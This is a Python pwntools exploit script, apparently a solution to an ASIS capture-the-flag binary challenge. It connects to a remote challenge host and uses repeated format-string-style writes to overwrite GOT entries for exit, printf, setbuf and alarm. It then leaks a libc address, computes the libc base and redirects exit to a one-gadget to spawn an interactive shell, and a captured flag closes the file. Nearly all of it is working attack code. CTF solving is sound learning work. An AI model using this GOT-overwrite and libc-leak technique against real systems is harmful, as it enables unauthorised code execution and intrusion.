from pwn import *
import sys

# local binary file
binary = "./bin/chall"
# format 'nc host port', 'host port', or 'host:port'
remote_target = "nc 65.21.255.31 33710"
remote_libc = "./lib/libc.so.6"

# clear context and set for challenge
context.clear()
context.terminal = ["konsole", "-e"]  # set as needed for you terminal
context.binary = binary

gdbscript = """
break *main+213
continue
"""


def parse_remote(target):
    rtgt = remote_target.split(" ")
    if len(rtgt) < 2:
        log.error(f"Invalid Remote Target \"{target}\"")
        sys.exit(1)
    elif len(rtgt) == 2 or len(rtgt) == 3:
        start_pos = 0 if len(rtgt) == 2 else 1
        try:
            comm = remote(rtgt[start_pos], int(rtgt[start_pos+1]), typ="tcp")
            libc = ELF(remote_libc)
            return comm, libc
        except:
            log.error(f"Failed to connect to \"{target}\"")
    else:
        log.error(f"Failed to parse format for \"{target}\"")


def main():
    if args.REMOTE:
        log.info("Remote Throw")
        comm, libc = parse_remote(remote_target)

    else:
        log.info("Local Throw")
        comm = process("./run.sh")
        libc = ELF("lib/libc.so.6")  # comm.libc
        libc.address = 0
        if args.GDB:
            log.info("Attaching GDB")
            gdb.attach(comm, gdbscript=gdbscript)

    libc.symbols["gadget"] = 0xe3b04

    print(libc)
    bin_rop = ROP(binary)
    bin_elf = ELF(binary)
    libc_rop = ROP(libc)

    pop_rdi = bin_rop.rdi
    binsh = next(libc.search(b"/bin/sh"))

    # # offset + 4 spots to account for call stack
    comm.recvuntil(b"size:")
    payload = b"9$8sAAAA" + \
        p64(bin_elf.symbols['got.exit']-1) + p64(bin_elf.symbols['main'])
    comm.sendline(payload)

    comm.recvuntil(b"size:")
    payload = b"9$8sAAAA" + \
        p64(bin_elf.symbols['stderr']-1) + p64(bin_elf.symbols['got.printf'])
    comm.sendline(payload)

    comm.recvuntil(b"size:")
    payload = b"9$8sAAAA" + \
        p64(bin_elf.symbols['got.setbuf']-1) + p64(bin_elf.symbols['puts'])
    comm.sendline(payload)

    comm.recvuntil(b"size:")
    payload = b"9$8sAAAA" + \
        p64(bin_elf.symbols['got.alarm']-1) + p64(bin_elf.symbols['main'])
    comm.sendline(payload)

    comm.recvuntil(b"size:")
    payload = b"9$8sAAAA" + \
        p64(bin_elf.symbols['got.exit']-1) + p64(bin_elf.symbols['setup'])
    comm.sendline(payload)

    # strip nonsense output and get leak
    comm.recvuntil(b"size:")
    comm.recvuntil(b"size:")
    comm.recvuntil(b"size:")
    comm.recvuntil(b"data: ")
    comm.recvline()
    comm.recvline()
    leak = u64(comm.recv(6).strip().ljust(8, b"\x00"))
    print(f"LIBC Printf: {hex(leak)}")
    libc.address = leak - libc.sym.printf
    print(f"LIBC Base: {hex(libc.address)}")
    comm.recvuntil(b"size:")

    # reset our main hook
    comm.recvuntil(b"size:")
    payload = b"9$8sAAAA" + \
        p64(bin_elf.symbols['got.exit']-1) + p64(bin_elf.symbols['main'])
    comm.sendline(payload)

    print(f"OneGadget: {hex(libc.sym.gadget)}")

    # onegadget
    payload = b"9$8sAAAA" + \
        p64(bin_elf.symbols['got.exit']-1) + p64(libc.sym.gadget)
    comm.sendline(payload)

    comm.interactive()


if __name__ == "__main__":
    main()

# ASIS{fd408e00d5824d7220c4d624f894144e}
